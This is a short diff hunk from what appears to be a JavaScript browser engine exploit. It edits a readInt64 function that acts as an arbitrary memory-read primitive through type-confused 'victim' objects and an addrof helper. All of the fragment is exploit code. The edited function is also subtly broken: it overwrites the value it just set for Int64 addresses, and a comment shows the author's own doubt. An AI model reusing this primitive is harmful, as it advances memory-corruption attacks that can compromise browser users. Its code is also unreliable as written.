@@ -557,14 +557,15 @@ for (var i = 0; i < 1000; ++i) {
             //victim1.prop = shared_butterfly;
             return res;
         },
-        readInt64: function(where,offset) {
-            //var reset = hax[1];
-	    if(offset) {
-                offset *= 8
-                return this.readInt64(where+offset);
-            }
+        readInt64: function(where) {
+            if (where instanceof Int64) {
+                where = Add(where, 0x10);
+		hax[1] = where.asDouble();
+	    } else {
+		hax[1] = qwordAsFloat(where + 0x10);
+	    }
             hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
-            var res = this.addrof(victim1.prop);
+            var res = floatAsQword(victim1.prop) //is this a double? //this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
             return new Int64(res);
